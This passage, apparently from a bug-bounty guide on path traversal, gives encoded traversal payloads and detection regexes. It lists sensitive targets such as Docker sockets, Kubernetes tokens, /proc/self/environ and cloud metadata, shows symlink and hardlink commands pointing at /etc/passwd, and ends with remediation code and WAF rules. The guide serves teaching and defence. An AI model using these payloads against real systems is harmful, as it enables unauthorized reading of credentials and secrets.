
```
# Regex patterns for detection
\.\.\/
\.\.\\
%2e%2e%2f
%2e%2e%5c
%c0%ae%c0%ae
```

### Advanced Encoding Techniques
Beyond basic URL encoding:

- **Double URL encoding:** %252e%252e%252f
- **Unicode normalization:** %c0%ae%c0%ae%c0%af
- **Overlong UTF-8:** %c0%ae (dot), %c0%af (slash)
- **HTML encoding:** &#46;&#46;&#47;
- **Null bytes:** %00, %2500

---

## Path Traversal in Modern Architectures

### Containerized Applications
Path traversal in containerized environments can lead to container escape:

- Accessing `/proc/1/root/` for host filesystem access
- Reading Docker socket at `/var/run/docker.sock`
- Accessing Kubernetes service account tokens at `/var/run/secrets/kubernetes.io/`
- Reading cloud metadata through container network

### Serverless Functions
Serverless functions may have path traversal through:

- Temporary filesystem access in Lambda functions
- Environment variable files at `/proc/self/environ`
- Layer caching directories
- Configuration file mounting

### Microservices
Path traversal in microservices architectures:

- Shared volume mounts between containers
- Configuration files mounted from ConfigMaps
- Secrets mounted as files
- Inter-service communication files

### Cloud-Native Applications
Path traversal in cloud environments:

- EC2 instance metadata files
- GCP metadata server access
- Azure instance metadata service
- IAM role credential files

---

## Case Study Analysis Framework

### Root Cause Categories

| Category | Description | Prevention |
|----------|-------------|------------|
| Missing Validation | No path validation at all | Implement allowlist validation |
| Weak Validation | Blacklist-based or regex validation | Use allowlist and canonicalization |
| Encoding Mismatch | Validation at different encoding layer | Validate at same layer as access |
| Legacy Features | Backward compatibility bypasses | Remove or secure legacy modes |
| Framework Trust | Assuming framework provides protection | Understand framework security properties |

### Impact Assessment Matrix

| File Type | Impact Level | Potential Chain |
|-----------|--------------|-----------------|
| /etc/passwd | Low | User enumeration |
| Configuration files | High | Credential exposure |
| Source code | High | Vulnerability discovery |
| Session files | Critical | Account takeover |
| Log files | Medium | Log poisoning to RCE |
| Cloud metadata | Critical | Infrastructure compromise |

### Bounty Justification Template

When writing a path traversal report, include:

1. **Root Cause:** Clear explanation of why the vulnerability exists
2. **Exploitation:** Step-by-step reproduction with code examples
3. **Impact:** Specific files accessed and data exposed
4. **Chain Potential:** How the finding can be escalated
5. **Remediation:** Concrete fix recommendations

---

## Advanced Path Traversal Concepts

### Path Normalization Bypasses
Different layers may normalize paths differently:

- Application layer: URL decoding, string replacement
- Web server layer: Path normalization, percent-decoding
- Operating system layer: Symlink resolution, case normalization
- Filesystem layer: Unicode normalization, character mapping

### Race Condition Exploitation
TOCTOU vulnerabilities in path validation:

1. Create symlink pointing to sensitive file
2. Trigger application to validate symlink path
3. Race to change symlink target before file access
4. Application reads sensitive file through manipulated symlink

### Symbolic Link Attacks
Using symlinks for path traversal:

```bash
# Create symlink to sensitive file
ln -s /etc/passwd /tmp/safe_link

# Application reads symlink
readlink -f /tmp/safe_link  # Returns /etc/passwd
```

### Hardlink Attacks
Using hardlinks for path traversal:

```bash
# Create hardlink to sensitive file
ln /etc/passwd /tmp/hardlink

# Application reads hardlink
stat /tmp/hardlink  # Shows original file properties
```

### Windows-Specific Techniques
Windows path traversal unique vectors:

- UNC paths: `\\127.0.0.1\share\file`
- Alternate data streams: `file.txt:hidden_stream`
- Device paths: `\\.\PhysicalDrive0`
- 8.3 short names: `PROGRA~1` for `Program Files`

---

## Remediation Implementation Guide

### Input Validation Implementation

```python
import os
from pathlib import Path

def validate_path(user_input, base_dir):
    # Resolve the full path
    full_path = Path(base_dir) / user_input
    resolved_path = full_path.resolve()
    
    # Ensure path is within base directory
    if not str(resolved_path).startswith(str(Path(base_dir).resolve())):
        raise ValueError("Path traversal detected")
    
    return resolved_path
```

### PHP Security Configuration

```php
// Disable remote includes
allow_url_include = Off
allow_url_fopen = Off

// Set open_basedir
open_basedir = /var/www/html:/tmp

// Disable dangerous functions
disable_functions = exec,passthru,shell_exec,system
```

### Web Server Configuration

```nginx
# Nginx: Prevent path traversal
location ~ \.\./ {
    deny all;
}

# Apache: Prevent path traversal
<DirectoryMatch "\.\./">
    Require all denied
</DirectoryMatch>
```

### WAF Rules

```# ModSecurity rule for path traversal
SecRule REQUEST_URI|REQUEST_HEADERS|ARGS "@rx \.\.\/" \
    "id:1001,phase:1,deny,status:403,msg:'Path Traversal Detected'"
```
